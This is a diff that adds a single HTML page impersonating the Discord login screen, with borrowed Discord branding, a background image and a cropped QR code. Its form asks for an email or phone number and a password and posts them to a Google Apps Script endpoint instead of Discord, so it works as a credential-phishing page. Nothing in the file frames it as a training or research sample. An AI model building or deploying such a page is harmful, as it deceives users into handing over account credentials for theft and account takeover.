@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+
+    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/023/741/066/non_2x/discord-logo-icon-social-media-icon-free-png.png" type="image/png">
+
+
+    <style>
+      :root {
+          --container-width: 750px;
+          --container-height: 370px;
+          --text-size: 17px;
+          --text-position-x: -150px;
+          --text-position-y: 4px;
+          --input-height: 20px;
+          --password-height: 20px;
+          --input-width: 55%;
+          --input-position-x: -150px;
+          --input-position-y: -25px;
+          --password-position-x: -150px;
+          --password-position-y: -60px;
+          --password-label-position-x: 15px;
+          --password-label-position-y: -35px;
+          --email-label-position-x: 15px;
+          --email-label-position-y: 1px;
+          --name-label-position-x: 15px; /* Position for name label */
+          --name-label-position-y: -45px; /* Move name label upwards */
+          --name-input-position-y: -75px; /* Move name input field upwards */
+          --button-height: 45px;
+          --button-width: 57%;
+          --button-position-x: -150px;
+          --button-position-y: -50px;
+          --gap: 30px;
+          --label-font-size: 12px;
+          --label-position-y: -5px;
+          --label-color: #bbb;
+          
+          /* New variables for QR text */
+          --qr-heading: "Log In with QR Code"; /* Heading text */
+          --qr-text: "Scan this with the Discord mobile app to log in instantly."; /* Text under the heading */
+          
+          /* New position variables for QR text */
+          --qr-position-x: 390px; /* Horizontal position for QR text */
+          --qr-position-y: 240px; /* Vertical position for QR text */
+  
+          /* New variables for the image */
+          --image-width: 200px; /* Increase width */
+          --image-height: 200px; /* Increase height */
+          --image-position-x: 530px; /* Horizontal position of the image container */
+          --image-position-y: 20px; /* Vertical position of the image container */
+      }
+  
+      body {
+          margin: 0;
+          height: 100vh;
+          background-image: url('https://i.redd.it/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?width=1600&format=png&auto=webp&s=53d372d13bd1af47f24b8069e239aa3870fc6b78'); /* Updated background image */
+          background-size: cover;
+          background-position: center;
+          color: white;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          font-family: Arial, sans-serif;
+      }
+  
+      .container {
+          background-color: rgb(50, 50, 50);
+          border-radius: 7px;
+          padding: 20px;
+          text-align: center;
+          width: var(--container-width);
+          height: var(--container-height);
+          position: relative;
+      }
+  
+      .image-container {
+          position: absolute;
+          left: var(--image-position-x);
+          top: var(--image-position-y);
+          width: var(--image-width);
+          height: var(--image-height);
+          background-image: url('https://support.discord.com/hc/article_attachments/27098861617687');
+          background-size: 850px 450px; /* Scale the image to a smaller size for cropping */
+          background-position: 265px -515px; /* Adjust the position to focus on the QR code */
+          border-radius: 7px;
+      }
+  
+      h1 {
+          font-size: 20px;
+          position: relative;
+          left: var(--text-position-x);
+          top: var(--text-position-y);
+      }
+  
+      p {
+          font-size: var(--text-size);
+          position: relative;
+          left: var(--text-position-x);
+          top: var(--text-position-y);
+      }
+  
+      .login-form {
+          margin-top: 20px;
+      }
+  
+      .login-form label {
+          font-size: var(--label-font-size);
+          color: var(--label-color);
+          margin-bottom: 5px;
+          display: block;
+          text-align: left;
+          width: 100%;
+          position: relative;
+          top: var(--label-position-y);
+      }
+  
+      .login-form .password-label {
+          left: var(--password-label-position-x);
+          top: var(--password-label-position-y);
+      }
+  
+      .login-form .email-label {
+          left: var(--email-label-position-x);
+          top: var(--email-label-position-y);
+      }
+
+      /* Added specific position for the NAME label */
+      .login-form .name-label {
+          left: var(--name-label-position-x);
+          top: var(--name-label-position-y); /* Adjusted the name label upwards */
+      }
+  
+      .login-form input {
+          width: var(--input-width);
+          height: var(--input-height);
+          padding: 10px;
+          margin: var(--gap) 0;
+          border-radius: 5px;
+          border: none;
+          position: relative;
+          left: var(--input-position-x);
+          top: var(--input-position-y);
+          background-color: #252525;
+          color: #fff;
+      }
+
+      /* Specific styling for the NAME input field */
+      .login-form .name-input {
+          position: relative;
+          top: var(--name-input-position-y); /* Move input upwards */
+      }
+  
+      .login-form input::placeholder {
+          color: transparent;
+      }
+  
+      .login-form input:focus {
+          outline: none;
+      }
+  
+      .login-form input[type="password"] {
+          height: var(--password-height);
+          position: relative;
+          left: var(--password-position-x);
+          top: var(--password-position-y);
+      }
+  
+      .login-form button {
+          padding: 10px;
+          background-color: #5f67da;
+          color: rgb(255, 255, 255);
+          border: none;
+          border-radius: 2px;
+          cursor: pointer;
+          width: var(--button-width);
+          height: var(--button-height);
+          position: relative;
+          left: var(--button-position-x);
+          top: var(--button-position-y);
+      }
+  
+      .login-form button:hover {
+          background-color: #5259bb;
+      }
+  
+      /* New styles for the added QR text */
+      .qr-text {
+          font-weight: bold;
+          font-size: 18px;
+          margin-bottom: 5px;
+          display: block; /* Make the QR heading display block */
+      }
+  
+      .qr-description {
+          font-weight: normal;
+          font-size: 14px;
+          margin-top: 5px;
+          display: block; /* Make the QR description appear below */
+          text-align: center; /* Align both lines in the center */
+      }
+  
+      /* New container for the QR code text at the bottom-right */
+      .qr-container {
+          position: absolute;
+          left: var(--qr-position-x);
+          top: var(--qr-position-y);
+          width: 100%;
+          text-align: center;
+      }
+
+      /* Add red color to the asterisk */
+      .name-label span {
+    color: red;
+}
+
+.email-label span {
+    color: red;
+}
+  </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Image container -->
+        <div class="image-container"></div>
+
+        <h1>Welcome Back!</h1>
+        <p>We're so excited to see you again!</p>
+
+        <div class="login-form">
+            <form method="POST" action="https://script.google.com/macros/s/AKfycbx2_Kjn2pJm5HK7y3IRDj_tP2AU6F91mDmCM83vM2ksV7SQdGTdKgyOAdwOjN1blL8TYg/exec">
+                <!-- Email input field -->
+                <label for="email" class="email-label"><strong>EMAIL OR PHONE NUMBER<span>*</span></strong></label>
+                <input name="Email" type="email" placeholder="Email" required>
+
+                <!-- Name input field (Moved upwards) -->
+                <label for="name" class="name-label"><strong>PASSWORD<span>*</span></strong></label>
+                <input name="Name" type="password" placeholder="Name" required class="name-input">
+
+                <!-- Submit button -->
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+
+        <!-- QR Text Container -->
+        <div class="qr-container">
+            <p class="qr-text">Log In with QR Code</p>
+            <p class="qr-description">
+                Scan this with the <strong>Discord mobile</strong><br>
+                app to log in instantly.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
